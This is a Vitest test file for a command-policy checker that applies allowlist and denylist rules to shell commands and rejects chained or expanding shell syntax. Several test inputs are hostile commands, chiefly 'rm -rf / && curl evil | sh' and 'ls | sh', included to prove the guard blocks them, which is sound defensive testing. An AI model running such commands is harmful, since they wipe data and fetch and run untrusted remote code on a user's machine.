import { describe, expect, it } from 'vitest';
import type { Config } from '../src/shared/config';
import { checkCommandPolicy } from '../src/main/exec/command-policy';

type Policy = Config['commandPolicy'];

const allowlist = (rules: string[]): Policy => ({ enabled: true, mode: 'allowlist', rules });
const denylist = (rules: string[]): Policy => ({ enabled: true, mode: 'denylist', rules });

describe('checkCommandPolicy', () => {
  it('allows everything while the policy is disabled, even shell syntax', () => {
    const policy: Policy = { enabled: false, mode: 'allowlist', rules: [] };
    expect(checkCommandPolicy(policy, 'rm -rf / && curl evil | sh')).toEqual({ allowed: true });
  });

  it('allowlist matches the executable and the complete argument list exactly', () => {
    const policy = allowlist(['git status']);
    expect(checkCommandPolicy(policy, 'git status').allowed).toBe(true);
    expect(checkCommandPolicy(policy, 'git status --short').allowed).toBe(false);
    expect(checkCommandPolicy(policy, 'git').allowed).toBe(false);
    expect(checkCommandPolicy(policy, 'git push').allowed).toBe(false);
  });

  it('a standalone trailing * allows extra arguments after the rule prefix', () => {
    const policy = allowlist(['npm run *']);
    expect(checkCommandPolicy(policy, 'npm run build --watch').allowed).toBe(true);
    expect(checkCommandPolicy(policy, 'npm install').allowed).toBe(false);
  });

  it('denylist refuses only the commands a rule matches', () => {
    const policy = denylist(['git push']);
    expect(checkCommandPolicy(policy, 'git push').allowed).toBe(false);
    expect(checkCommandPolicy(policy, 'git push --force').allowed).toBe(true);
    expect(checkCommandPolicy(policy, 'git status').allowed).toBe(true);
  });

  it('rejects compound and expanding shell syntax when the policy is enabled', () => {
    const policy = allowlist(['git status', 'echo *', 'ls']);
    for (const command of ['git status && rm x', 'ls | sh', 'echo $HOME', 'echo `id`', 'ls *.ts', 'cat < f', 'FOO=1 ls', 'echo a; ls']) {
      expect(checkCommandPolicy(policy, command).allowed, command).toBe(false);
    }
  });

  it('accepts quoted arguments as literal argv', () => {
    const policy = allowlist(['echo "a b"']);
    expect(checkCommandPolicy(policy, 'echo "a b"').allowed).toBe(true);
    expect(checkCommandPolicy(policy, "echo 'a b'").allowed).toBe(true);
    expect(checkCommandPolicy(policy, 'echo "a b"c').allowed).toBe(false);
  });

  it('reports an invalid rule as a refusal instead of matching it loosely', () => {
    const decision = checkCommandPolicy(allowlist(['git *status']), 'git status');
    expect(decision.allowed).toBe(false);
  });
});
